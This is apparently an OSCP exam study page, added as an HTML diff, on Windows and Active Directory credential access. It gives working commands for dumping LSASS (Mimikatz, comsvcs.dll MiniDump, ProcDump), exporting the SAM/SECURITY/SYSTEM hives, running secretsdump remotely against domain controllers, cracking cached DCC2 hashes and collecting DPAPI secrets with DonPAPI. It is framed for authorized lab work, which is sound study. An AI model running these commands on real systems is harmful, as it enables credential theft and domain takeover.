@@ -1,0 +1,445 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Windows and Domain Credential Access."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/02-credential-access/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Windows and Domain Credential Access | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Windows and Domain Credential Access."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/06-ad-lateral-movement/02-credential-access/"><title>Windows and Domain Credential Access | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#1-select-the-source-before-the-tool">1. Select the source before the tool</a></li><li class="level-2"><a href="#2-establish-privilege-and-protection-state">2. Establish privilege and protection state</a></li><li class="level-2"><a href="#3-inspect-tickets-before-invasive-collection">3. Inspect tickets before invasive collection</a></li><li class="level-2"><a href="#4-lsass-live-logon-session-material">4. LSASS: live logon-session material</a></li><li class="level-3"><a href="#direct-mimikatz-access">Direct Mimikatz access</a></li><li class="level-3"><a href="#dump-first-parse-offline">Dump first, parse offline</a></li><li class="level-2"><a href="#5-sam-and-system-local-identities">5. SAM and SYSTEM: local identities</a></li><li class="level-2"><a href="#6-security-and-system-lsa-secrets-and-cached-domain-verifiers">6. SECURITY and SYSTEM: LSA secrets and cached domain verifiers</a></li><li class="level-2"><a href="#7-credential-manager-and-dpapi">7. Credential Manager and DPAPI</a></li><li class="level-2"><a href="#8-ntds-and-replication-paths">8. NTDS and replication paths</a></li><li class="level-3"><a href="#offline-ntds-from-an-already-controlled-dc">Offline NTDS from an already controlled DC</a></li><li class="level-3"><a href="#remote-collection">Remote collection</a></li><li class="level-2"><a href="#9-classify-before-choosing-the-transition">9. Classify before choosing the transition</a></li><li class="level-2"><a href="#10-failure-router">10. Failure router</a></li><li class="level-2"><a href="#tooling-for-this-section">Tooling for this section</a></li><li class="level-2"><a href="#donpapi--remote-dpapiapplication-secret-collection-with-host-rights">DonPAPI — remote DPAPI/application-secret collection with host rights</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="windows-and-domain-credential-access">Windows and Domain Credential Access</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/README.md">← Stage index</a> | <a href="/tools/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Domain mapping</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential handling</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/active-directory.md">AD cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/credentials.md">Recover and use authentication material</a>; <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/ad-identities.md">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Prerequisite:</strong> an already authorized host/session and the exact privilege required by the selected source. Do not collect everything by default.</p>
+<p><strong>Decision:</strong> <code>CURRENT IDENTITY → SOURCE → REQUIRED PRIVILEGE/PROTECTION → ARTIFACT TYPE → COMPATIBLE NEXT USE</code>.</p>
+<p><strong>Exit:</strong> classify each result as password, NT hash, AES key, ticket, DPAPI material, cached verifier or local/domain secret; protect it in private records and re-enumerate only through compatible authentication.</p>
+</blockquote>
+<h2 id="1-select-the-source-before-the-tool">1. Select the source before the tool</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Source</th><th>What it can contain</th><th>Typical prerequisite</th><th>Result is not automatically</th></tr></thead><tbody><tr><td>Current ticket cache</td><td>TGTs and service tickets for the current logon session</td><td>Current user; other LUIDs normally require elevation</td><td>A password, NT hash or authorization to every service</td></tr><tr><td>LSASS memory/dump</td><td>Logon-session NTLM/AES/DPAPI material and tickets, depending on OS/protection/logon type</td><td>Administrator/SYSTEM, suitable debug/dump access, compatible architecture</td><td>Guaranteed cleartext or every user's reusable secret</td></tr><tr><td>SAM + SYSTEM</td><td>Local account password hashes</td><td>Administrator/SYSTEM/backup-capable access to matched hives</td><td>Domain-account material</td></tr><tr><td>SECURITY + SYSTEM</td><td>LSA secrets, service/machine secrets, cached domain verifiers</td><td>Administrator/SYSTEM/backup-capable access to matched hives</td><td>Directly passable cached-domain hashes</td></tr><tr><td>Credential Manager/DPAPI</td><td>Targeted saved credentials and protected application data</td><td>Suitable user/machine context plus master-key material</td><td>Plaintext merely because a blob/file is readable</td></tr><tr><td>NTDS + SYSTEM</td><td>Domain account hashes/keys from a DC database</td><td>DC-level file access and matched boot-key material</td><td>Ordinary member-server admin access</td></tr><tr><td>DRS replication</td><td>Selected domain-account secrets</td><td>Effective replication rights at the domain root</td><td>Local admin, DC service access or Domain Users membership</td></tr></tbody></table>
+<h2 id="2-establish-privilege-and-protection-state">2. Establish privilege and protection state</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">whoami /all
+tasklist /fi "imagename eq lsass.exe"
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LsaCfgFlags
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard /v LsaCfgFlags
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard |
+  Select-Object SecurityServicesConfigured,SecurityServicesRunning,VirtualizationBasedSecurityStatus
+</code></pre>
+<p>Interpretation:</p>
+<ul>
+<li>membership in Administrators with a medium-integrity filtered token is not equivalent to an elevated process;</li>
+<li><code>SeDebugPrivilege</code> must be present and usable for common live-process access;</li>
+<li>a missing registry value is not definitive proof that a protection is disabled because defaults, policy and firmware state matter;</li>
+<li>LSA protection blocks untrusted code injection/process-memory access; Credential Guard isolates selected NTLM, Kerberos and saved-domain secrets with VBS;</li>
+<li>EDR/AV can block a tool or dump path without proving the underlying credential source is empty.</li>
+</ul>
+<p>An access-denied or empty result disproves only that method in the current context.</p>
+<h2 id="3-inspect-tickets-before-invasive-collection">3. Inspect tickets before invasive collection</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">klist
+klist tgt
+klist sessions
+</code></pre>
+<p>When privileges permit inspecting another logon session:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">klist -li 0xLUID tickets
+klist -li 0xLUID tgt
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">Rubeus.exe triage
+Rubeus.exe dump /luid:0xLUID /nowrap
+</code></pre>
+<blockquote>
+<p>Do not use <code>klist purge</code> during triage. It destroys cached tickets and can break the current session. Interpret exported tickets using <a href="/tools/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/#6-ticket-inventory-classification-and-conversion">Kerberos and identity transitions</a>.</p>
+</blockquote>
+<h2 id="4-lsass-live-logon-session-material">4. LSASS: live logon-session material</h2>
+<h3 id="direct-mimikatz-access">Direct Mimikatz access</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+</code></pre>
+<p>Decisive output is a named logon session with a typed value: NTLM, AES key, DPAPI key or ticket. A username with <code>Password : (null)</code> is not a failed tool run when another useful field exists, and modern Windows commonly does not retain reusable cleartext.</p>
+<h3 id="dump-first-parse-offline">Dump first, parse offline</h3>
+<p>Built-in <code>comsvcs.dll</code> method from an elevated command prompt:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">for /f "tokens=2" %A in ('tasklist ^| findstr /i lsass.exe') do rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump %A C:\Windows\Temp\lsass.dmp full
+</code></pre>
+<p>Sysinternals ProcDump alternative:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
+</code></pre>
+<p>Parse with a compatible Mimikatz build:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">mimikatz.exe
+sekurlsa::minidump C:\Path\To\lsass.dmp
+sekurlsa::logonpasswords
+sekurlsa::tickets
+</code></pre>
+<p>Common failures:</p>
+<ul>
+<li>dump creation denied: token/protection/EDR or process-access prerequisite failed;</li>
+<li><code>ProcessorArchitecture</code> mismatch: use compatible x64/x86 tooling;</li>
+<li>OS major-version mismatch: parse with a compatible build/environment;</li>
+<li>dump succeeds but secrets are absent: logon type, sign-out/reboot, Credential Guard and provider behavior affect contents.</li>
+</ul>
+<p>LSASS dumps are sensitive and noisy. Hash the evidence if needed, transfer through the established route, store it privately and remove the target copy after the authorized objective.</p>
+<h2 id="5-sam-and-system-local-identities">5. SAM and SYSTEM: local identities</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">reg save HKLM\SAM C:\Windows\Temp\SAM.hive /y
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<p>Mimikatz alternative from a suitable elevated context:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">privilege::debug
+token::elevate
+lsadump::sam
+</code></pre>
+<p>Interpret a typical account row as:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">LOCAL_USER:RID:LM_HASH:NT_HASH:::
+</code></pre>
+<p>The NT hash is local-account material. Its reuse depends on the same local password existing elsewhere, account state, remote UAC restrictions, service support and host authorization. Return it to the credential-classification workflow; do not call it a domain credential.</p>
+<h2 id="6-security-and-system-lsa-secrets-and-cached-domain-verifiers">6. SECURITY and SYSTEM: LSA secrets and cached domain verifiers</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">reg save HKLM\SECURITY C:\Windows\Temp\SECURITY.hive /y
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive /y
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<p>Mimikatz alternative:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">privilege::debug
+token::elevate
+lsadump::secrets
+lsadump::cache
+</code></pre>
+<p>Potential categories:</p>
+<ul>
+<li><code>$MACHINE.ACC</code>: member computer's domain-account secret/key material;</li>
+<li>service/autologon secrets: usefulness depends on whether the service/account remains active;</li>
+<li><code>NL$1</code>-style cached logon data: DCC2/MSCache v2 verifier material.</li>
+</ul>
+<p>DCC2 is for offline guessing, not Pass-the-Hash:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -m 2100 dcc2.hashes wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+</code></pre>
+<p>Verify the exact format with the installed Hashcat examples before cracking.</p>
+<h2 id="7-credential-manager-and-dpapi">7. Credential Manager and DPAPI</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
+Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force -ErrorAction SilentlyContinue
+Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Force -Recurse -ErrorAction SilentlyContinue
+</code></pre>
+<p>For each entry record target, type, username, persistence/context and whether a compatible application can ask Windows to use it. A listed credential is not necessarily exportable plaintext.</p>
+<p>DPAPI reasoning:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">PROTECTED BLOB
+-> MASTER-KEY GUID
+-> USER OR MACHINE PROTECT SCOPE
+-> MASTER-KEY DECRYPTION MATERIAL
+-> APPLICATION-SPECIFIC DECODING
+</code></pre>
+<p>Possible decryption material includes the already logged-on user context, the user's password/NT hash, machine context or a domain DPAPI backup key. Prefer using the authorized existing context rather than copying unrelated protected data. One blob without its master key/context is incomplete.</p>
+<h2 id="8-ntds-and-replication-paths">8. NTDS and replication paths</h2>
+<h3 id="offline-ntds-from-an-already-controlled-dc">Offline NTDS from an already controlled DC</h3>
+<p>An offline parse needs a matched <code>NTDS.dit</code> and SYSTEM hive:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -ntds NTDS.dit -system SYSTEM.hive LOCAL
+</code></pre>
+<p>Obtaining locked DC database files normally requires DC-level privilege and a snapshot/backup-aware method. Ordinary local administrator on a member server does not provide this material.</p>
+<h3 id="remote-collection">Remote collection</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -dc-ip DC_IP 'DOMAIN/USER:PASSWORD@DC_HOST'
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -hashes :NT_HASH -dc-ip DC_IP 'DOMAIN/USER@DC_HOST'
+</code></pre>
+<p>This broad form can invoke several remote collection paths and is high impact. Use it only when the lab objective and privileges justify those sources. For replication rights and a bounded one-user request, use <a href="/tools/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/#dcsync-replication-rights">DCSync</a>.</p>
+<h2 id="9-classify-before-choosing-the-transition">9. Classify before choosing the transition</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Output</th><th>Type</th><th>Immediate compatible possibilities</th><th>Not valid as</th></tr></thead><tbody><tr><td>Cleartext password</td><td>Reusable secret</td><td>Password authentication, key derivation, DPAPI where applicable</td><td>Proof of authorization</td></tr><tr><td>NT hash</td><td>NTLM key</td><td>Offline crack; PTH where NTLM/service policy allows; Kerberos RC4 transition where supported</td><td>Net-NTLM response or DCC2</td></tr><tr><td>AES128/AES256 key</td><td>Kerberos long-term key</td><td>Request Kerberos material using compatible tooling</td><td>Direct NTLM authentication</td></tr><tr><td><code>.kirbi</code> / ccache</td><td>Kerberos ticket container</td><td>Use while valid for its client/realm/SPN scope</td><td>Password/hash</td></tr><tr><td>DCC2/MSCache v2</td><td>Offline verifier</td><td>Offline cracking</td><td>PTH</td></tr><tr><td>DPAPI key/blob</td><td>Protected-data material</td><td>Decrypt only with matching context/keys</td><td>General logon credential</td></tr><tr><td>Machine-account key</td><td>Computer identity</td><td>Map the computer account's rights and Kerberos/NTLM paths</td><td>Human/domain-admin identity</td></tr></tbody></table>
+<p>Every newly usable identity returns to Block 10 before movement:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">VERIFY MATERIAL -> AUTHENTICATE SAFELY -> CONFIRM IDENTITY
+                -> MAP GROUPS/RIGHTS/SHARES/HOSTS/ROUTES
+</code></pre>
+<h2 id="10-failure-router">10. Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Symptom</th><th>Interpretation</th><th>Next action</th></tr></thead><tbody><tr><td><code>privilege::debug</code> fails</td><td>Token is not elevated or privilege is unavailable</td><td>Verify integrity/privileges; use another authorized source</td></tr><tr><td>LSASS open/dump denied</td><td>PPL/Credential Guard/EDR/token limitation</td><td>Confirm protection state; do not infer no credentials</td></tr><tr><td>Dump parser architecture/version error</td><td>Tool/dump incompatibility</td><td>Match architecture and compatible OS/tool build</td></tr><tr><td><code>Password : (null)</code></td><td>Provider did not retain cleartext</td><td>Inspect typed hashes/keys/tickets; do not force a cleartext assumption</td></tr><tr><td>SAM parse boot-key error</td><td>SYSTEM/SAM mismatch or damaged export</td><td>Reacquire matched hives from the same state</td></tr><tr><td>SECURITY output shows cached domain values only</td><td>Offline verifiers, not reusable NT hashes</td><td>Use the correct offline format</td></tr><tr><td>Credential Manager lists target but no secret</td><td>Reference is context/application-bound</td><td>Test through the owning authorized context or DPAPI chain</td></tr><tr><td>DPAPI blob cannot decrypt</td><td>Missing master key/protecting context/material</td><td>Map blob → GUID → protect scope → key</td></tr><tr><td>Remote <code>secretsdump</code> denied</td><td>Remote admin/registry/replication prerequisite absent</td><td>Stop broad retries; determine which source/right was actually expected</td></tr><tr><td>DRS request denied</td><td>Effective domain-root replication rights absent</td><td>Validate the exact ACEs; local admin is irrelevant</td></tr></tbody></table>
+<h2 id="tooling-for-this-section">Tooling for this section</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Tool</th><th>Choose it when</th><th>Requirements</th><th>Baseline</th><th>Decisive output</th><th>Failure cue</th></tr></thead><tbody><tr><td><code>klist</code></td><td>Current Windows ticket inventory</td><td>Windows logon session; elevation for some LUIDs</td><td><code>klist</code></td><td>Client, server/SPN, validity and cache</td><td>Empty cache or inaccessible LUID</td></tr><tr><td>Mimikatz</td><td>Source/rights justify live or offline credential parsing</td><td>Trusted compatible build; appropriate privilege</td><td><code>privilege::debug</code>, selected <code>sekurlsa</code>/<code>lsadump</code> command</td><td>Typed secret tied to identity/logon</td><td>PPL/CG/EDR, architecture or token failure</td></tr><tr><td>ProcDump/<code>comsvcs.dll</code></td><td>Authorized LSASS dump for offline analysis</td><td>Elevated process access; writable destination</td><td>Section 4</td><td>Complete dump file</td><td>Access denied/blocking/partial dump</td></tr><tr><td><code>reg save</code></td><td>Matched local registry hives</td><td>Administrator/SYSTEM or backup-capable context</td><td>Sections 5–6</td><td>Successful hive exports</td><td>Access denied or mismatched point-in-time files</td></tr><tr><td><code>impacket-secretsdump</code></td><td>Parse matched hives or use a validated remote/DRS path</td><td>Installed version, selected source and its privilege</td><td><code>-sam/-system LOCAL</code> or narrow DRS request</td><td>Correctly typed rows</td><td>Boot-key mismatch, remote-right or DRS failure</td></tr><tr><td><code>cmdkey</code>/<code>vaultcmd</code></td><td>Locate saved credential targets/types</td><td>Current user context</td><td><code>cmdkey /list</code></td><td>Target/type/user clues</td><td>Listed entry without exportable secret</td></tr><tr><td>Hashcat</td><td>Offline guessing of a classified verifier</td><td>Correct mode, candidate list/rule and compute</td><td><code>-m 2100</code> for DCC2, <code>-m 1000</code> for NTLM</td><td>Recovered candidate verified against artifact</td><td>Token-length/format/mode mismatch</td></tr></tbody></table>
+<h2 id="donpapi--remote-dpapiapplication-secret-collection-with-host-rights">DonPAPI — remote DPAPI/application-secret collection with host rights</h2>
+<p>Use after confirming the accepted identity has the required administrative/remote access on this Windows host. SMB, remote operations and the available masterkey material affect what can be decrypted; ordinary domain-user authentication is not enough.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># One named host and one relevant collector, not automatic whole-domain targeting
+donpapi collect -d DOMAIN -u USER -p 'PASSWORD' -t TARGET -c CredMan
+
+# Distinct authentication material: the tool expects LMHASH:NTHASH form
+donpapi collect -d DOMAIN -u USER \
+  -H 'aad3b435b51404eeaad3b435b51404ee:HASH' -t TARGET -c CredMan
+</code></pre>
+<p>Read: distinguish acquired encrypted artifacts from decrypted credentials and identify each artifact's profile/application. Remote Registry/SAM/LSA operations can require service-control rights and alter service state. Bring the relevant password/hash/masterkey/PVK when needed; <code>--fetch-pvk</code> is not a default action and requires additional domain rights. An empty result can be a collection or decryption failure. Validate a recovered identity before moving.</p>
+<p>Sources: <a href="https://github.com/login-securite/DonPAPI">upstream 1</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 23, especially pp758–767 and pp779–784.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication">Microsoft Windows authentication credential processes</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection">Microsoft LSA protection</a></li>
+<li><a href="https://learn.microsoft.com/windows/security/identity-protection/credential-guard/">Microsoft Credential Guard</a></li>
+<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa">Mimikatz <code>sekurlsa</code></a> and <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump"><code>lsadump</code></a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/secretsdump.py">Impacket <code>secretsdump</code></a></li>
+<li><a href="https://learn.microsoft.com/sysinternals/downloads/procdump">Microsoft PsTools/ProcDump</a></li>
